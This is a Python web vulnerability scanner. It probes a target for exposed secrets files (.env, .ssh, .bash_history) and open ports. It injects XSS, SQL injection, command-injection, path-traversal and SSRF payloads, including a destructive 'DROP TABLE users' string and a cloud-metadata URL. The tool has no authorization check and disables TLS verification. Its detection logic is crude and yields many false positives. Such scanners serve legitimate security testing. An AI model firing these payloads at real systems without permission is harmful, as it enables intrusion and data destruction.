import socket, threading, urllib.parse, http.client, ssl, json, time, queue
from html.parser import HTMLParser

class WebScanner:
    def __init__(self):
        self.timeout = 10
        self.threads = 10

    def full_scan(self, target):
        self.target = target
        self.results = []
        self.lock = threading.Lock()
        self.common_paths = [
            '/admin', '/login', '/wp-admin', '/phpmyadmin', '/administrator',
            '/backup', '/config', '/.git', '/.env', '/robots.txt',
            '/sitemap.xml', '/.htaccess', '/test', '/debug', '/api',
            '/uploads', '/images', '/css', '/js', '/includes',
            '/.ssh', '/.mysql_history', '/backup.sql', '/database.sql',
            '/wp-config.php', '/config.php', '/settings.py', '/.bash_history'
        ]
        self.sql_errors = [
            "mysql_fetch_array", "mysql_fetch_assoc", "mysql_fetch_row",
            "mysql_num_rows", "mysql_result", "You have an error in your SQL syntax",
            "Warning: mysql", "Microsoft OLE DB Provider for ODBC Drivers",
            "ODBC Microsoft Access Driver", "Microsoft JET Database Engine",
            "ORA-", "PLS-", "SQLServer JDBC Driver", "SQLException",
            "Unclosed quotation mark", "PostgreSQL query failed",
            "SQLite.Exception", "MariaDB", "PdoException", "SQLSTATE"
        ]
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<video onloadstart=alert('XSS')><source>"
        ]
        self.command_injection_payloads = [
            ";id", "|whoami", "&&cat /etc/passwd", "`ls`",
            "$(ls)", "|dir", "&ver", ";uname -a"
        ]
        self.file_inclusion_payloads = [
            "../../../../etc/passwd", "../../../../windows/win.ini",
            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"
        ]

        base_url = self.normalize_url(self.target)
        parsed = urllib.parse.urlparse(base_url)
        host = parsed.netloc
        
        scan_functions = [
            lambda: self.check_headers(base_url),
            lambda: self.directory_bruteforce(base_url),
            lambda: self.crawl_links(base_url),
            lambda: self.port_scan(host),
            lambda: self.test_sql_injection(base_url),
            lambda: self.test_xss(base_url),
            lambda: self.test_command_injection(base_url),
            lambda: self.test_file_inclusion(base_url),
            lambda: self.check_http_methods(base_url),
            lambda: self.test_ssrf(base_url)
        ]
        
        threads = []
        for func in scan_functions:
            t = threading.Thread(target=func)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return self.analyze_vulnerabilities()

    def analyze_vulnerabilities(self):
        critical = []
        high = []
        medium = []
        low = []
        info = []
        
        for result in self.results:
            vuln_type = result['type']
            
            if vuln_type == 'SQL Injection':
                critical.append({
                    'type': 'SQL Injection',
                    'severity': 'CRITICAL',
                    'url': result['url'],
                    'parameter': result['parameter'],
                    'payload': result['payload'],
                    'impact': 'Complete database compromise, data theft, authentication bypass'
                })
            elif vuln_type == 'XSS':
                high.append({
                    'type': 'Cross-Site Scripting',
                    'severity': 'HIGH',
                    'url': result['url'],
                    'parameter': result['parameter'],
                    'payload': result['payload'],
                    'impact': 'Session hijacking, credential theft, defacement'
                })
            elif vuln_type == 'Command Injection':
                critical.append({
                    'type': 'Command Injection',
                    'severity': 'CRITICAL',
                    'url': result['url'],
                    'parameter': result['parameter'],
                    'payload': result['payload'],
                    'impact': 'Remote code execution, server compromise'
                })
            elif vuln_type == 'File Inclusion':
                high.append({
                    'type': 'File Inclusion',
                    'severity': 'HIGH',
                    'url': result['url'],
                    'parameter': result['parameter'],
                    'payload': result['payload'],
                    'impact': 'Sensitive file disclosure, source code exposure'
                })
            elif vuln_type == 'SSRF':
                high.append({
                    'type': 'Server-Side Request Forgery',
                    'severity': 'HIGH',
                    'url': result['url'],
                    'payload': result['payload'],
                    'impact': 'Internal network scanning, service enumeration'
                })
            elif vuln_type == 'Directory/File Found':
                if any(sensitive in result['url'].lower() for sensitive in ['.env', 'config', 'backup', '.git', '.ssh']):
                    high.append({
                        'type': 'Sensitive File Exposure',
                        'severity': 'HIGH',
                        'url': result['url'],
                        'status': result['status'],
                        'impact': 'Credentials leakage, source code exposure'
                    })
                else:
                    medium.append({
                        'type': 'Directory Listing',
                        'severity': 'MEDIUM',
                        'url': result['url'],
                        'status': result['status'],
                        'impact': 'Information disclosure, attack surface expansion'
                    })
            elif vuln_type == 'Open Port':
                if result['port'] in [22, 21, 23, 3306, 5432]:
                    medium.append({
                        'type': 'Service Exposure',
                        'severity': 'MEDIUM',
                        'service': f"Port {result['port']}",
                        'host': result['host'],
                        'impact': 'Service enumeration, brute force attacks'
                    })
                else:
                    low.append({
                        'type': 'Open Port',
                        'severity': 'LOW',
                        'service': f"Port {result['port']}",
                        'host': result['host'],
                        'impact': 'Limited information disclosure'
                    })
            elif vuln_type == 'Security Headers':
                missing_headers = [k for k, v in result['headers'].items() if v == 'Missing']
                if missing_headers:
                    medium.append({
                        'type': 'Missing Security Headers',
                        'severity': 'MEDIUM',
                        'url': result['url'],
                        'missing': missing_headers,
                        'impact': 'Increased XSS and clickjacking risk'
                    })
            elif vuln_type == 'HTTP Methods':
                if 'dangerous' in result:
                    high.append({
                        'type': 'Dangerous HTTP Methods',
                        'severity': 'HIGH',
                        'url': result['url'],
                        'methods': result['dangerous'],
                        'impact': 'Data modification, deletion, cross-site tracing'
                    })
            elif vuln_type == 'Discovered Link':
                info.append({
                    'type': 'Internal Link',
                    'severity': 'INFO',
                    'url': result['url'],
                    'impact': 'Attack surface mapping'
                })
        
        return critical + high + medium + low + info

    def normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')

    def get_connection(self, url):
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme == 'https':
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(parsed.netloc, timeout=self.timeout, context=context)
        else:
            conn = http.client.HTTPConnection(parsed.netloc, timeout=self.timeout)
        return conn, parsed

    def test_sql_injection(self, url):
        sql_payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--", "1 UNION SELECT 1,2,3--", "' AND 1=1--"]
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in sql_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    conn, parsed_url = self.get_connection(test_url)
                    conn.request("GET", f"{parsed_url.path}?{parsed_url.query}" if parsed_url.query else parsed_url.path)
                    response = conn.getresponse()
                    body = response.read().decode('utf-8', errors='ignore')
                    
                    for error in self.sql_errors:
                        if error.lower() in body.lower():
                            with self.lock:
                                self.results.append({
                                    'type': 'SQL Injection',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload
                                })
                            break
                    conn.close()
                except:
                    pass

    def test_xss(self, url):
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in self.xss_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    conn, parsed_url = self.get_connection(test_url)
                    conn.request("GET", f"{parsed_url.path}?{parsed_url.query}" if parsed_url.query else parsed_url.path)
                    response = conn.getresponse()
                    body = response.read().decode('utf-8', errors='ignore')
                    
                    if payload in body:
                        with self.lock:
                            self.results.append({
                                'type': 'XSS',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload
                            })
                    conn.close()
                except:
                    pass

    def test_command_injection(self, url):
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in self.command_injection_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    conn, parsed_url = self.get_connection(test_url)
                    conn.request("GET", f"{parsed_url.path}?{parsed_url.query}" if parsed_url.query else parsed_url.path)
                    response = conn.getresponse()
                    body = response.read().decode('utf-8', errors='ignore')
                    
                    if any(indicator in body.lower() for indicator in ['root', 'administrator', 'etc/passwd', 'windows', 'system32']):
                        with self.lock:
                            self.results.append({
                                'type': 'Command Injection',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload
                            })
                    conn.close()
                except:
                    pass

    def test_file_inclusion(self, url):
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in self.file_inclusion_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    conn, parsed_url = self.get_connection(test_url)
                    conn.request("GET", f"{parsed_url.path}?{parsed_url.query}" if parsed_url.query else parsed_url.path)
                    response = conn.getresponse()
                    body = response.read().decode('utf-8', errors='ignore')
                    
                    if any(indicator in body.lower() for indicator in ['root:', 'administrator:', '[extensions]', 'fonts']):
                        with self.lock:
                            self.results.append({
                                'type': 'File Inclusion',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload
                            })
                    conn.close()
                except:
                    pass

    def test_ssrf(self, url):
        ssrf_payloads = [
            "http://localhost:22", "http://127.0.0.1:3306", 
            "http://169.254.169.254/latest/meta-data/",
            "http://internal.api.local"
        ]
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in ssrf_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    conn, parsed_url = self.get_connection(test_url)
                    conn.request("GET", f"{parsed_url.path}?{parsed_url.query}" if parsed_url.query else parsed_url.path)
                    response = conn.getresponse()
                    body = response.read().decode('utf-8', errors='ignore')
                    
                    if response.status != 404 and len(body) > 0:
                        with self.lock:
                            self.results.append({
                                'type': 'SSRF',
                                'url': test_url,
                                'payload': payload
                            })
                    conn.close()
                except:
                    pass

    def check_http_methods(self, url):
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
        try:
            conn, parsed = self.get_connection(url)
            for method in dangerous_methods:
                conn.request(method, parsed.path)
                response = conn.getresponse()
                if response.status not in [405, 501]:
                    with self.lock:
                        self.results.append({
                            'type': 'HTTP Methods',
                            'url': url,
                            'dangerous': [method]
                        })
            conn.close()
        except:
            pass

    def directory_bruteforce(self, base_url):
        q = queue.Queue()
        for path in self.common_paths:
            q.put(path)
        
        def worker():
            while not q.empty():
                try:
                    path = q.get_nowait()
                    test_url = f"{base_url}{path}"
                    
                    try:
                        conn, parsed = self.get_connection(test_url)
                        conn.request("GET", parsed.path)
                        response = conn.getresponse()
                        
                        if response.status in [200, 301, 302, 403]:
                            with self.lock:
                                self.results.append({
                                    'type': 'Directory/File Found',
                                    'url': test_url,
                                    'status': response.status
                                })
                        conn.close()
                    except:
                        pass
                    q.task_done()
                except queue.Empty:
                    return
        
        threads = []
        for _ in range(min(self.threads, q.qsize())):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()

    def check_headers(self, url):
        try:
            conn, parsed = self.get_connection(url)
            conn.request("HEAD", parsed.path)
            response = conn.getresponse()
            headers = dict(response.getheaders())
            
            security_headers = {
                'X-Frame-Options': 'Missing',
                'X-Content-Type-Options': 'Missing',
                'X-XSS-Protection': 'Missing',
                'Strict-Transport-Security': 'Missing',
                'Content-Security-Policy': 'Missing'
            }
            
            for header in security_headers:
                if header in headers:
                    security_headers[header] = headers[header]
            
            with self.lock:
                self.results.append({
                    'type': 'Security Headers',
                    'url': url,
                    'headers': security_headers
                })
            
            conn.close()
        except:
            pass

    def port_scan(self, host, ports=[80, 443, 8080, 8443, 22, 21, 23, 3306, 5432, 27017]):
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    with self.lock:
                        self.results.append({
                            'type': 'Open Port',
                            'host': host,
                            'port': port
                        })
            except:
                pass
        
        threads = []
        for port in ports:
            t = threading.Thread(target=scan_port, args=(port,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()

    def crawl_links(self, base_url):
        class LinkParser(HTMLParser):
            def __init__(self, base_url):
                super().__init__()
                self.links = set()
                self.base_url = base_url
            
            def handle_starttag(self, tag, attrs):
                if tag == 'a':
                    for attr, value in attrs:
                        if attr == 'href' and value:
                            full_url = urllib.parse.urljoin(self.base_url, value)
                            if full_url.startswith(self.base_url):
                                self.links.add(full_url)
        
        try:
            conn, parsed = self.get_connection(base_url)
            conn.request("GET", parsed.path)
            response = conn.getresponse()
            body = response.read().decode('utf-8', errors='ignore')
            
            parser = LinkParser(base_url)
            parser.feed(body)
            
            for link in parser.links:
                with self.lock:
                    self.results.append({
                        'type': 'Discovered Link',
                        'url': link
                    })
            
            conn.close()
        except:
            pass